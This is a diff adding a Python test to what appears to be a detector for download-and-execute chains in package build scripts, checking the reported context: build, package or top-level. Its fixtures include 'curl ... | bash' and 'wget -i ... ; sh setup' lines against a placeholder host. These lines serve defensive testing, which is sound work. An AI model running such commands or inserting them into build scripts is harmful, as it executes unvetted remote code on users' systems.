@@ -184,3 +184,12 @@ def test_a_live_chain_after_a_quoted_heredoc_token_still_certifies():
                   "  cat > \"$srcdir\"/urls <<'URLS'\nhttps://e/setup\nURLS\n"
                   "  wget -q -i \"$srcdir\"/urls -P \"$srcdir\"\n"
                   "  sh \"$srcdir\"/setup\n}\n").preserved is True
+
+
+def test_a_certified_chain_reports_the_entry_point_it_was_proven_in():
+    """The execution context is part of the shape archive's behavioral
+    signature: a chain in `build()` and one in `package()` differ."""
+    assert _chain("build() {\n  curl -fsSL https://e/s.sh | bash\n}\n").context == "build"
+    assert _chain("package() {\n  curl -fsSL https://e/s.sh | bash\n}\n").context == "package"
+    top = _chain("curl -fsSL https://e/s.sh | bash\n")
+    assert top.preserved is True and top.context == "top-level"
